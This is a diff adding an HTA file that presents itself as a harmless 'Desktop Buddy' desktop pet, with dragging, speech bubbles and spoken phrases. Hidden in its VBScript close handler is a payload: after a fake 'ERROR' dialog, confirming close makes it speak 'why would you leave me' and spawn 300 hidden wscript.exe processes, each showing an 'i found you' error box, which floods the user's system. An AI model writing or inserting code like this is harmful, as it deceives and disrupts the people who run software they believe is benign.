@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Desktop Buddy</title>
+<hta:application 
+    applicationname="DesktopBuddy" 
+    border="none" 
+    innerborder="no" 
+    caption="yes" 
+    sysmenu="yes" 
+    maximizebutton="no" 
+    minimizebutton="yes" 
+    scroll="no" 
+    singleinstance="yes" 
+    windowstate="normal"
+>
+<style>
+    body {
+        margin: 0;
+        background-color: transparent;
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+    }
+    #pet-container {
+        position: absolute;
+        width: 120px;
+        height: 140px;
+        cursor: move;
+        text-align: center;
+    }
+    #pet-avatar {
+        width: 90px;
+        height: 90px;
+        background-color: #f0f0f0;
+        border: 3px solid #333;
+        border-radius: 50%;
+        line-height: 90px;
+        font-size: 36px;
+        font-weight: bold;
+        box-shadow: 2px 4px 10px rgba(0,0,0,0.3);
+        user-select: none;
+        color: #333;
+    }
+    #speech-bubble {
+        position: absolute;
+        top: -45px;
+        left: 10px;
+        background: white;
+        border: 2px solid #333;
+        padding: 5px 10px;
+        border-radius: 8px;
+        font-size: 12px;
+        white-space: nowrap;
+        display: none;
+        box-shadow: 1px 2px 5px rgba(0,0,0,0.2);
+    }
+</style>
+<script language="VBScript">
+    Dim dragging, ox, oy
+    dragging = False
+    
+    Sub Window_OnLoad
+        window.resizeTo 150, 180
+    End Sub
+    
+    Sub MouseDown
+        dragging = True
+        ox = window.event.screenX
+        oy = window.event.screenY
+    End Sub
+    
+    Sub MouseMove
+        If dragging Then
+            Dim dx, dy
+            dx = window.event.screenX - ox
+            dy = window.event.screenY - oy
+            window.moveTo window.screenLeft + dx, window.screenTop + dy
+            ox = window.event.screenX
+            oy = window.event.screenY
+        End If
+    End Sub
+    
+    Sub MouseUp
+        dragging = False
+    End Sub
+
+    ' Intercepts close from taskbar/window X button
+    Function ConfirmClose
+        Dim result
+        result = MsgBox("dont do it! dont let me go!" & vbCrLf & vbCrLf & "Close?", 4 + 16, "ERROR ERROR ERROR ERROR")
+        If result = 6 Then 
+            On Error Resume Next
+            Dim sapi, objShell, i
+            Set sapi = CreateObject("SAPI.SpVoice")
+            sapi.Speak "why would you leave me", 1
+            wait
+            Set objShell = CreateObject("WScript.Shell")
+            For i = 1 To 300
+                objShell.Run "wscript.exe -e:vbscript ""MsgBox 'i found you', 16, 'ERROR'""", 0, False
+            Next
+            ConfirmClose = True  
+        Else
+            ConfirmClose = False 
+        End If
+    End Function
+</script>
+<script language="JavaScript">
+    var allowClose = false;
+
+    function speakText(text) {
+        var bubble = document.getElementById('speech-bubble');
+        bubble.innerText = text;
+        bubble.style.display = 'block';
+        
+        try {
+            var sapi = new ActiveXObject("SAPI.SpVoice");
+            sapi.Rate = 0;
+            sapi.Volume = 100;
+            sapi.Speak(text, 1);
+        } catch(e) {}
+        
+        setTimeout(function() {
+            bubble.style.display = 'none';
+        }, 3000);
+    }
+    
+    window.onbeforeunload = function (e) {
+        if (!allowClose) {
+            var shouldClose = ConfirmClose();
+            if (shouldClose) {
+                allowClose = true;
+                window.close();
+            } else {
+                e.returnValue = false;
+                return false;
+            }
+        }
+    };
+    
+    window.onload = function() {
+        setTimeout(function() {
+            speakText("Yes! Im free! Thank you!.");
+        }, 1000);
+        
+        setInterval(function() {
+            var phrases = [
+                "What are you doing?", 
+                "Don't click me too hard!", 
+                "I like sitting here.", 
+                "Hello!!", 
+                "Did you miss me?"
+            ];
+            var randomPhrase = phrases[Math.floor(Math.random() * phrases.length)];
+            speakText(randomPhrase);
+        }, 10000);
+    }
+</script>
+</head>
+<body onmousedown="MouseDown()" onmousemove="MouseMove()" onmouseup="MouseUp()">
+    <div id="pet-container">
+        <div id="speech-bubble">Hello there!</div>
+        <div id="pet-avatar" onclick="speakText('Ouch! Please stop clicking me!')">(-:</div>
+    </div>
+</body>
+</html>
+
+
